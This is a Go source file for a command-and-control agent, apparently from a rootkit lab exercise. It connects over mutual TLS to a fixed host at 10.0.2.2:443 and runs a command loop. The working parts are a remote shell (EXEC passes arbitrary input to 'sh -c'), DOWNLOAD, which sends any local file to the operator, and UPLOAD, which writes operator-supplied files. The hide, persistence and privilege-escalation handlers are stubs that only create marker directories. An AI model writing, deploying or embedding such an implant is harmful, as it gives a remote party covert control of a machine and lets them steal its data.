// Agent with command dispatch, remote shell, and file transfer over mTLS.
package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

//go:embed certs/ca.crt
var caCert []byte

//go:embed certs/agent.crt
var agentCert []byte

//go:embed certs/agent.key
var agentKey []byte

func dial() (net.Conn, error) {
	cert, err := tls.X509KeyPair(agentCert, agentKey)
	if err != nil {
		return nil, fmt.Errorf("load agent cert: %w", err)
	}

	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(caCert) {
		return nil, fmt.Errorf("invalid CA cert")
	}

	cfg := &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      pool,
		MinVersion:   tls.VersionTLS13,
	}

	return tls.Dial("tcp", "10.0.2.2:443", cfg)
}

func mkdirCmd(name string) error {
	return os.Mkdir("rklings."+name, 0755)
}

type handler func(r *bufio.Reader, conn net.Conn, arg string) error

func handlePing(r *bufio.Reader, conn net.Conn, arg string) error {
	_, err := fmt.Fprintln(conn, "PONG")
	return err
}

func handleStatus(r *bufio.Reader, conn net.Conn, arg string) error {
	mkdirCmd("status")
	_, err := fmt.Fprintln(conn, "OK")
	return err
}

func handleHide(r *bufio.Reader, conn net.Conn, arg string) error {
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) < 2 {
		_, err := fmt.Fprintln(conn, "ERR missing argument")
		return err
	}

	subcmd := parts[0]
	target := parts[1]

	switch subcmd {
	case "FILE":
		mkdirCmd("h.f." + target)
	case "PID":
		mkdirCmd("h.i." + target)
	case "PORT":
		mkdirCmd("h.p." + target)
	default:
		_, err := fmt.Fprintln(conn, "ERR unknown hide target")
		return err
	}

	_, err := fmt.Fprintln(conn, "OK")
	return err
}

func handlePersist(r *bufio.Reader, conn net.Conn, arg string) error {
	mkdirCmd("persist")
	_, err := fmt.Fprintln(conn, "OK")
	return err
}

func handleEscalate(r *bufio.Reader, conn net.Conn, arg string) error {
	mkdirCmd("e")
	_, err := fmt.Fprintln(conn, "OK")
	return err
}

func handleExec(r *bufio.Reader, conn net.Conn, arg string) error {
	out, err := exec.Command("sh", "-c", arg).CombinedOutput()
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n\n", err)
		return nil
	}
	fmt.Fprintf(conn, "%s\n", out)
	return nil
}

func handleDownload(r *bufio.Reader, conn net.Conn, arg string) error {
	path := strings.TrimSpace(arg)
	f, err := os.Open(path)
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return nil
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return nil
	}

	fmt.Fprintf(conn, "%d\n", info.Size())
	io.Copy(conn, f)
	return nil
}

func handleUpload(r *bufio.Reader, conn net.Conn, arg string) error {
	// Parse "path size" from arg
	lastSpace := strings.LastIndex(arg, " ")
	if lastSpace < 0 {
		fmt.Fprintln(conn, "ERR missing size")
		return nil
	}

	path := arg[:lastSpace]
	sizeStr := arg[lastSpace+1:]
	size, err := strconv.ParseInt(sizeStr, 10, 64)
	if err != nil {
		fmt.Fprintf(conn, "ERR bad size: %v\n", err)
		return nil
	}

	f, err := os.Create(path)
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return nil
	}

	_, err = io.Copy(f, io.LimitReader(r, size))
	f.Close()
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return nil
	}

	_, err = fmt.Fprintln(conn, "OK")
	return err
}

var handlers = map[string]handler{
	"PING":     handlePing,
	"STATUS":   handleStatus,
	"HIDE":     handleHide,
	"PERSIST":  handlePersist,
	"ESCALATE": handleEscalate,
	"EXEC":     handleExec,
	"DOWNLOAD": handleDownload,
	"UPLOAD":   handleUpload,
}

func dispatch(conn net.Conn) {
	r := bufio.NewReader(conn)
	for {
		line, err := r.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimRight(line, "\r\n")
		if line == "" {
			continue
		}

		parts := strings.SplitN(line, " ", 2)
		cmd := parts[0]
		arg := ""
		if len(parts) > 1 {
			arg = parts[1]
		}

		if cmd == "QUIT" {
			return
		}

		h, ok := handlers[cmd]
		if !ok {
			fmt.Fprintln(conn, "ERR unknown command")
			continue
		}

		if err := h(r, conn, arg); err != nil {
			log.Printf("handler %s: %v", cmd, err)
			return
		}
	}
}

func main() {
	conn, err := dial()
	if err != nil {
		log.Fatalf("dial: %v", err)
	}
	defer conn.Close()

	dispatch(conn)
}
